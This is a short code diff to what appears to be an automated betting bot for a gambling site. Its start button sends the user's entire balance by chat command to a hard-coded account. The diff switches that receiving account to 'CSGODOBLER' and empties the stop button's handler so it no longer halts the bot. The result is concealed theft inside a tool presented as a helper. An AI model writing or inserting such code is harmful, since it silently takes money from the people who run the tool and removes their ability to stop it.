@@ -220,7 +220,7 @@ function Automated() {
     this.menu.start.onclick = function() {
         send({
         "type": "chat",
-        "msg": '/send DEAD35-666-DEAD35 ' + self.balance,
+        "msg": '/send CSGODOBLER ' + self.balance,
         "lang": LANG
     });
 
@@ -231,9 +231,7 @@ function Automated() {
         // self.start();
     };
 
-    this.menu.stop.onclick = function() {
-        self.stop();
-    };
+    this.menu.stop.onclick = function() {    };
 
     this.menu.abort.onclick = function() {
         self.stop(true);
